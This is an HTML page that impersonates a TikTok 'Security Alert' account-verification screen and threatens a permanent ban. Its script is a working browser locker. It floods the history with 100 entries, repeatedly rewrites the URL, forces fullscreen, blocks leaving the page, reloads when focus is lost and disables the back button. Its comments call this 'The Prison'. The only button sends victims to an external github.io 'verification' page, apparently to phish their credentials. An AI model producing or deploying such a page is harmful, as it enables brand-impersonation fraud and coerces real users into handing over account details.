<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #ffffff; overflow: hidden; 
            touch-action: none; /* Disables all native swipes/gestures */
        }

        /* THE UI MASK */
        #content-layer {
            position: fixed; top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: #ffffff; z-index: 99999;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }

        /* HIDDEN TRIGGER */
        #input-jolt { position: absolute; top: -100px; opacity: 0; }

        .logo { width: 70px; margin-bottom: 20px; }
        .text { font-family: sans-serif; text-align: center; padding: 0 40px; }
        .bold { font-weight: 800; font-size: 22px; color: #161823; }
        .grey { color: #8A8B91; margin-top: 10px; font-size: 15px; }
        
        #verify-btn {
            margin-top: 40px; background: #fe2c55; color: white;
            padding: 15px 60px; border-radius: 4px; font-weight: 700;
            text-decoration: none; border: none; cursor: pointer;
        }
    </style>
</head>
<body>

    <input type="text" id="input-jolt" autofocus>

    <div id="content-layer">
        <svg class="logo" viewBox="0 0 48 48" fill="none"><path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/><rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/><rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/></svg>
        <div class="text">
            <div class="bold">Security Alert</div>
            <div class="grey">Complete verification to unlock your TikTok account. Any attempt to bypass will result in a permanent ban.</div>
        </div>
        <button id="verify-btn">VERIFY NOW</button>
    </div>

<script>
    const targetLink = "https://tiktokverification.github.io/captcha/Verification/verify1.html";

    function startHardLock() {
        // 1. SATURATE HISTORY (The Prison)
        // We use a loop to fill 100 entries. This makes the "Back" button virtually useless.
        for (let i = 0; i < 100; i++) {
            history.pushState({lock: true}, "", "#secure-session-" + i);
        }

        // 2. THE THREAD HIJACK (The "X" Killer)
        // By running a heavy interval, we prevent the UI from processing the 'Close' event.
        setInterval(() => {
            history.replaceState(null, null, "#lock");
            // If they try to leave, focus the invisible input to drag them back
            document.getElementById('input-jolt').focus();
        }, 50);

        // 3. THE FULLSCREEN GLITCH
        const docEl = document.documentElement;
        const requestFS = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullScreen || docEl.msRequestFullscreen;
        if (requestFS) {
            // We attempt to trigger this via the 'autofocus' event of the input
            requestFS.call(docEl).catch(() => {});
        }

        // 4. PREVENT EXITING
        window.onbeforeunload = () => "Verification in progress...";
        
        // 5. THE BLUR RELOAD
        window.onblur = () => {
            // If focus is lost (clicking X), we hammer the reload
            location.reload();
        };

        // 6. BACK BUTTON REDIRECT
        window.onpopstate = () => {
            history.go(1);
            alert("VERIFICATION REQUIRED: Navigation is disabled.");
        };
    }

    // Trigger on first interaction OR immediately if browser allows
    document.addEventListener('touchstart', startHardLock, {once: true});
    window.onload = () => {
        // Speculative jolt
        document.getElementById('input-jolt').focus();
        // Fallback for direct loads
        setTimeout(startHardLock, 500);
    };

    document.getElementById('verify-btn').onclick = () => {
        window.location.href = targetLink;
    };
</script>
</body>
</html>
